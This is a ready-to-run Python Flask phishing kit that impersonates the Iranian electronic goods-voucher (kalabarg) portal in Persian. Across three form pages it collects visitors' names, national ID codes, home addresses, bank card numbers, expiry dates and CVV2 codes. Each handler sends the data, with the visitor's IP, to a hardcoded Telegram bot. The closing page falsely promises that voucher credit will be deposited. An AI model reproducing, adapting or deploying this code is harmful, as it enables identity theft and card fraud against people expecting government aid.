import requests
from flask import Flask, request

BOT_TOKEN = "8528248141:AAHjKBWXN5E7DWmMlCOkEFYB-kL1kyVTwmE"
CHAT_ID   = "2028533085"

app = Flask(__name__)

def send_telegram(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text},
            timeout=5,
        )
    except:
        pass

# ====== صفحه اول: اطلاعات هویتی ======
html_step1 = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>سامانه کالابرگ الکترونیکی</title>
<link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
<style>
  body { font-family: 'Vazirmatn', sans-serif; background: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
  .container { background: white; width: 90%; max-width: 400px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); overflow: hidden; }
  .header { background: #007bff; color: white; text-align: center; padding: 20px; }
  .header h2 { margin: 0; font-size: 18px; }
  .body { padding: 25px; }
  .input-group { margin-bottom: 15px; }
  .input-group label { display: block; margin-bottom: 5px; font-size: 13px; color: #555; }
  .input-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-family: inherit; }
  .btn { width: 100%; padding: 14px; background: #007bff; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; font-family: inherit; }
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h2>سامانه کالابرگ الکترونیکی</h2>
  </div>
  <div class="body">
    <form method="POST" action="/step2">
      <div class="input-group">
        <label>نام</label>
        <input type="text" name="first_name" required placeholder="نام خود را وارد کنید">
      </div>
      <div class="input-group">
        <label>نام خانوادگی</label>
        <input type="text" name="last_name" required placeholder="نام خانوادگی">
      </div>
      <div class="input-group">
        <label>کد ملی</label>
        <input type="text" name="national_id" required placeholder="کد ملی ۱۰ رقمی" maxlength="10">
      </div>
      <button type="submit" class="btn">مرحله بعد</button>
    </form>
  </div>
</div>
</body>
</html>
"""

# ====== صفحه دوم: آدرس ======
html_step2 = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>سامانه کالابرگ الکترونیکی</title>
<link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
<style>
  body { font-family: 'Vazirmatn', sans-serif; background: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
  .container { background: white; width: 90%; max-width: 400px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); overflow: hidden; }
  .header { background: #007bff; color: white; text-align: center; padding: 20px; }
  .header h2 { margin: 0; font-size: 18px; }
  .body { padding: 25px; }
  .input-group { margin-bottom: 15px; }
  .input-group label { display: block; margin-bottom: 5px; font-size: 13px; color: #555; }
  .input-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-family: inherit; }
  .btn { width: 100%; padding: 14px; background: #007bff; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; font-family: inherit; }
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h2>سامانه کالابرگ الکترونیکی</h2>
  </div>
  <div class="body">
    <form method="POST" action="/step3">
      <div class="input-group">
        <label>شهر</label>
        <input type="text" name="city" required placeholder="نام شهر">
      </div>
      <div class="input-group">
        <label>آدرس دقیق</label>
        <input type="text" name="address" required placeholder="خیابان، کوچه، پلاک">
      </div>
      <div class="input-group">
        <label>کد پستی</label>
        <input type="text" name="postal_code" placeholder="کد پستی ۱۰ رقمی" maxlength="10">
      </div>
      <button type="submit" class="btn">مرحله بعد</button>
    </form>
  </div>
</div>
</body>
</html>
"""

# ====== صفحه سوم: کارت بانکی ======
html_step3 = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>سامانه کالابرگ الکترونیکی</title>
<link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
<style>
  body { font-family: 'Vazirmatn', sans-serif; background: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
  .container { background: white; width: 90%; max-width: 400px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); overflow: hidden; }
  .header { background: #28a745; color: white; text-align: center; padding: 20px; }
  .header h2 { margin: 0; font-size: 18px; }
  .body { padding: 25px; }
  .input-group { margin-bottom: 15px; }
  .input-group label { display: block; margin-bottom: 5px; font-size: 13px; color: #555; }
  .input-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-family: inherit; text-align: left; direction: ltr; }
  .btn { width: 100%; padding: 14px; background: #28a745; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; font-family: inherit; }
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h2>ثبت اطلاعات بانکی جهت دریافت اعتبار</h2>
  </div>
  <div class="body">
    <form method="POST" action="/finish">
      <div class="input-group">
        <label>شماره کارت</label>
        <input type="text" name="card_number" required placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="16">
      </div>
      <div class="input-group">
        <label>تاریخ انقضا</label>
        <input type="text" name="expiry" required placeholder="MM/YY" maxlength="5">
      </div>
      <div class="input-group">
        <label>CVV2</label>
        <input type="password" name="cvv2" required placeholder="***" maxlength="4">
      </div>
      <button type="submit" class="btn">دریافت اعتبار</button>
    </form>
  </div>
</div>
</body>
</html>
"""

@app.route("/")
def home():
    return html_step1

@app.route("/step2", methods=["POST"])
def step2():
    fname = request.form.get("first_name", "")
    lname = request.form.get("last_name", "")
    nid = request.form.get("national_id", "")
    ip = request.remote_addr

    send_telegram(
        f"🪪 **اطلاعات هویتی (کالابرگ)**\n\n"
        f"👤 نام: {fname}\n"
        f"👤 نام خانوادگی: {lname}\n"
        f"🆔 کد ملی: {nid}\n"
        f"🌐 IP: {ip}"
    )
    return html_step2

@app.route("/step3", methods=["POST"])
def step3():
    city = request.form.get("city", "")
    addr = request.form.get("address", "")
    postal = request.form.get("postal_code", "")
    ip = request.remote_addr

    send_telegram(
        f"📍 **اطلاعات آدرس**\n\n"
        f"🏙️ شهر: {city}\n"
        f"🏠 آدرس: {addr}\n"
        f"📮 کد پستی: {postal}\n"
        f"🌐 IP: {ip}"
    )
    return html_step3

@app.route("/finish", methods=["POST"])
def finish():
    card = request.form.get("card_number", "")
    exp = request.form.get("expiry", "")
    cvv = request.form.get("cvv2", "")
    ip = request.remote_addr

    send_telegram(
        f"💳 **اطلاعات بانکی**\n\n"
        f"💳 شماره کارت: {card}\n"
        f"📅 تاریخ انقضا: {exp}\n"
        f"🔐 CVV2: {cvv}\n"
        f"🌐 IP: {ip}"
    )
    
    return """
    <html lang="fa" dir="rtl">
    <body style="font-family: Tahoma, sans-serif; text-align: center; padding: 50px; background: #f4f6f9;">
        <h2 style="color: #28a745;">ثبت اطلاعات با موفقیت انجام شد</h2>
        <p style="color: #555;">اعتبار کالابرگ به حساب شما واریز خواهد شد.</p>
    </body>
    </html>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
